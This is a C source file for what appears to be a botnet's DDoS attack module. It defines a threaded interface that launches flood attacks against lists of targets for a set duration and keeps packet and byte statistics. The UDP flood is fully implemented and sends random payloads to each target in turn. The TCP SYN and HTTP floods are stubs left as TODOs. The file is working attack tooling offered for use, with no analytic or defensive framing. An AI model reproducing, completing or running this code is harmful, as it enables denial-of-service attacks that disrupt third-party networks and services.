/**
 * @file attack_modern.c
 * @brief Modern attack module implementation
 * 
 * This module provides a clean, modular interface for various attack vectors.
 * All attacks are non-blocking and use async I/O where possible.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>

#include "attack_modern.h"
#include "../common/logger.h"
#include "../common/util.h"

// Attack handle structure
struct attack_handle {
    attack_vector_t vector;
    attack_target_t *targets;
    size_t target_count;
    attack_option_t *options;
    size_t option_count;
    uint32_t duration;
    
    pthread_t thread;
    bool running;
    
    attack_stats_t stats;
};

// Forward declarations
static void *attack_thread_udp_flood(void *arg);
static void *attack_thread_tcp_syn(void *arg);
static void *attack_thread_http_flood(void *arg);
static int attack_get_option_int(attack_option_t *options, size_t count, uint8_t key, int default_val);
static const char *attack_get_option_str(attack_option_t *options, size_t count, uint8_t key, const char *default_val);

int attack_modern_init(void) {
    log_info("Attack module initialized");
    return 0;
}

attack_handle_t *attack_modern_start(
    attack_vector_t vector,
    attack_target_t *targets,
    size_t target_count,
    attack_option_t *options,
    size_t option_count,
    uint32_t duration
) {
    if (target_count == 0 || targets == NULL) {
        log_error("Invalid targets");
        return NULL;
    }
    
    attack_handle_t *handle = calloc(1, sizeof(attack_handle_t));
    if (handle == NULL) {
        log_error("Failed to allocate attack handle");
        return NULL;
    }
    
    handle->vector = vector;
    handle->duration = duration;
    handle->target_count = target_count;
    handle->option_count = option_count;
    handle->running = true;
    
    // Copy targets
    handle->targets = calloc(target_count, sizeof(attack_target_t));
    if (handle->targets == NULL) {
        free(handle);
        return NULL;
    }
    memcpy(handle->targets, targets, target_count * sizeof(attack_target_t));
    
    // Copy options
    if (option_count > 0 && options != NULL) {
        handle->options = calloc(option_count, sizeof(attack_option_t));
        if (handle->options == NULL) {
            free(handle->targets);
            free(handle);
            return NULL;
        }
        memcpy(handle->options, options, option_count * sizeof(attack_option_t));
    }
    
    // Initialize stats
    handle->stats.start_time = time(NULL);
    handle->stats.active = true;
    
    // Start appropriate thread based on vector
    void *(*thread_func)(void *) = NULL;
    
    switch (vector) {
        case ATTACK_VECTOR_UDP_FLOOD:
            thread_func = attack_thread_udp_flood;
            break;
        case ATTACK_VECTOR_TCP_SYN:
            thread_func = attack_thread_tcp_syn;
            break;
        case ATTACK_VECTOR_HTTP_FLOOD:
            thread_func = attack_thread_http_flood;
            break;
        default:
            log_error("Unsupported attack vector: %d", vector);
            free(handle->options);
            free(handle->targets);
            free(handle);
            return NULL;
    }
    
    if (pthread_create(&handle->thread, NULL, thread_func, handle) != 0) {
        log_error("Failed to create attack thread");
        free(handle->options);
        free(handle->targets);
        free(handle);
        return NULL;
    }
    
    log_info("Started attack: vector=%d, targets=%zu, duration=%u", 
             vector, target_count, duration);
    
    return handle;
}

void attack_modern_stop(attack_handle_t *handle) {
    if (handle == NULL) return;
    
    handle->running = false;
    pthread_join(handle->thread, NULL);
    
    handle->stats.end_time = time(NULL);
    handle->stats.active = false;
    
    log_info("Stopped attack: packets=%lu, bytes=%lu", 
             handle->stats.packets_sent, handle->stats.bytes_sent);
    
    free(handle->options);
    free(handle->targets);
    free(handle);
}

void attack_modern_get_stats(attack_handle_t *handle, attack_stats_t *stats) {
    if (handle == NULL || stats == NULL) return;
    memcpy(stats, &handle->stats, sizeof(attack_stats_t));
}

void attack_modern_cleanup(void) {
    log_info("Attack module cleanup complete");
}

// UDP Flood implementation
static void *attack_thread_udp_flood(void *arg) {
    attack_handle_t *handle = (attack_handle_t *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        log_error("Failed to create UDP socket: %s", strerror(errno));
        return NULL;
    }
    
    int payload_size = attack_get_option_int(handle->options, handle->option_count, 
                                             ATTACK_OPT_PAYLOAD_SIZE, 512);
    bool random_payload = attack_get_option_int(handle->options, handle->option_count,
                                                ATTACK_OPT_PAYLOAD_RANDOM, 1);
    
    char *payload = malloc(payload_size);
    if (payload == NULL) {
        close(sock);
        return NULL;
    }
    
    time_t end_time = time(NULL) + handle->duration;
    size_t target_idx = 0;
    
    while (handle->running && time(NULL) < end_time) {
        if (random_payload) {
            for (int i = 0; i < payload_size; i++) {
                payload[i] = rand() % 256;
            }
        }
        
        attack_target_t *target = &handle->targets[target_idx];
        
        ssize_t sent = sendto(sock, payload, payload_size, 0,
                             (struct sockaddr *)&target->addr,
                             sizeof(struct sockaddr_in));
        
        if (sent > 0) {
            handle->stats.packets_sent++;
            handle->stats.bytes_sent += sent;
        } else {
            handle->stats.errors++;
        }
        
        target_idx = (target_idx + 1) % handle->target_count;
    }
    
    free(payload);
    close(sock);
    return NULL;
}

// TCP SYN flood implementation (requires raw sockets)
static void *attack_thread_tcp_syn(void *arg) {
    attack_handle_t *handle = (attack_handle_t *)arg;
    
    // TODO: Implement raw socket SYN flooding
    log_warn("TCP SYN flood not yet implemented in modern module");
    
    time_t end_time = time(NULL) + handle->duration;
    while (handle->running && time(NULL) < end_time) {
        sleep(1);
    }
    
    return NULL;
}

// HTTP flood implementation
static void *attack_thread_http_flood(void *arg) {
    attack_handle_t *handle = (attack_handle_t *)arg;
    
    // TODO: Implement HTTP flooding with connection reuse
    log_warn("HTTP flood not yet implemented in modern module");
    
    time_t end_time = time(NULL) + handle->duration;
    while (handle->running && time(NULL) < end_time) {
        sleep(1);
    }
    
    return NULL;
}

// Helper: Get integer option value
static int attack_get_option_int(attack_option_t *options, size_t count, uint8_t key, int default_val) {
    for (size_t i = 0; i < count; i++) {
        if (options[i].key == key) {
            return atoi(options[i].value);
        }
    }
    return default_val;
}

// Helper: Get string option value
static const char *attack_get_option_str(attack_option_t *options, size_t count, uint8_t key, const char *default_val) {
    for (size_t i = 0; i < count; i++) {
        if (options[i].key == key) {
            return options[i].value;
        }
    }
    return default_val;
}
